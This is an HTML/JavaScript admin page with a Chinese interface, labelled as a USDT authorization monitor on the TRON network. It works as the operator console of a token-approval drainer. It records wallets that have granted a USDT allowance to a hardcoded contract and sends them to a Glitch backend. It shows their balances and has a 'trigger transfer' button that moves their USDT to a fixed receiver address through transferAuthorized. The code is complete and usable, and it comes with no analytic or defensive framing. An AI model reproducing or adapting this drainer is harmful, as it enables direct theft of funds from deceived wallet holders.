<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8">
  <title>USDT 授權監控後台</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.min.js"></script>
  <style>
    body { font-family: sans-serif; padding: 2em; background: #f2f2f2; text-align: center; }
    h1 { color: #2c3e50; }
    .wallet-card {
      background: #fff;
      border-radius: 10px;
      padding: 1em;
      margin: 1em auto;
      width: 90%;
      max-width: 400px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
      text-align: left;
    }
    button {
      background: #0984e3;
      color: #fff;
      border: none;
      padding: 0.5em 1em;
      border-radius: 6px;
      margin-top: 0.5em;
      cursor: pointer;
    }
    input[type="text"], input[type="number"] {
      width: 80%;
      padding: 0.5em;
      margin-top: 0.5em;
    }
    #status { margin-top: 1em; color: #636e72; }
  </style>
</head>
<body>
  <h1>🔐 USDT 授權監控</h1>
  <div>
    <input type="text" id="checkWallet" placeholder="輸入錢包地址查詢">
    <button onclick="checkWallet()">查詢授權</button>
  </div>
  <div id="wallets"></div>
  <div id="status">尚未連接錢包</div>

  <script>
    const AUTH_CONTRACT = "TMxu165T2e3ZKWzgt7gipzmHwE5KYuibGa";
    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    const RECEIVER = "THjNpJWbuGxvhR9kDDTDz1wVKhe2PWLfNR";
    const BACKEND = "https://peaceful-precious-ceres.glitch.me";
    const approvedWallets = [];

    async function checkWallet() {
      const address = document.getElementById("checkWallet").value.trim();
      if (!address || !/^T[a-zA-Z0-9]{33}$/.test(address)) {
        return alert("請輸入有效的 TRON 錢包地址（以 T 開頭，共 34 字元）");
      }
      try {
        if (!window.tronWeb || !tronWeb.defaultAddress.base58) {
          return alert("請使用 TronLink DApp 瀏覽器開啟此頁面，並確保已登入錢包");
        }

        const usdt = await tronWeb.contract().at(USDT_CONTRACT);
        const allowance = await usdt.allowance(address, AUTH_CONTRACT).call();
        const allowed = parseFloat(allowance.toString()) / 1e6;

        alert(`授權額度：${allowed} USDT`);

        if (allowed > 0) {
          await axios.post(`${BACKEND}/wallets`, { address });
          if (!approvedWallets.includes(address)) {
            approvedWallets.push(address);
          }
          await renderWallets();
        }
      } catch (err) {
        console.error(err);
        alert("查詢失敗：" + err.message);
      }
    }

    async function renderWallets() {
      try {
        const res = await axios.get(`${BACKEND}/wallets`);
        const usdt = await tronWeb.contract().at(USDT_CONTRACT);
        const wrap = document.getElementById("wallets");
        wrap.innerHTML = "";

        for (const addr of res.data) {
          const balance = await usdt.balanceOf(addr).call();
          const trx = await tronWeb.trx.getBalance(addr);
          const allow = await usdt.allowance(addr, AUTH_CONTRACT).call();

          const usdtBal = parseFloat(balance.toString()) / 1e6;
          const trxBal = parseFloat(trx.toString()) / 1e6;
          const allowance = parseFloat(allow.toString()) / 1e6;

          const div = document.createElement("div");
          div.className = "wallet-card";
          div.innerHTML = `
            <div><strong>地址：</strong>${addr}</div>
            <div>USDT 餘額：${usdtBal}</div>
            <div>TRX 餘額：${trxBal}</div>
            <div>授權額度：${allowance}</div>
            <input type="number" id="amount-${addr}" placeholder="輸入要轉的 USDT 金額">
            <button onclick="triggerTransfer('${addr}')">🚀 觸發轉帳</button>
          `;
          wrap.appendChild(div);
        }
      } catch (err) {
        console.error("renderWallets error", err);
        alert("錢包資料讀取失敗");
      }
    }

    async function triggerTransfer(from) {
      const input = document.getElementById(`amount-${from}`);
      const amount = parseFloat(input.value);
      if (!amount || amount <= 0) return alert("請輸入有效金額");

      try {
        const contract = await tronWeb.contract().at(AUTH_CONTRACT);
        await contract.transferAuthorized(
          USDT_CONTRACT,
          from,
          RECEIVER,
          tronWeb.toSun(amount)
        ).send();

        alert(`✅ 已觸發 ${amount} USDT 轉帳`);
      } catch (err) {
        console.error("轉帳錯誤", err);
        alert("❌ 轉帳失敗：" + err.message);
      }
    }

    window.addEventListener("load", () => {
      let attempts = 0;
      const check = setInterval(() => {
        if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
          clearInterval(check);
          document.getElementById("status").innerText = "🟢 已連接：" + tronWeb.defaultAddress.base58;
          renderWallets();
        } else {
          attempts++;
          document.getElementById("status").innerText = "等待錢包連接中...（" + attempts + ")";
          if (attempts > 20) clearInterval(check);
        }
      }, 800);
    });
  </script>
</body>
</html>
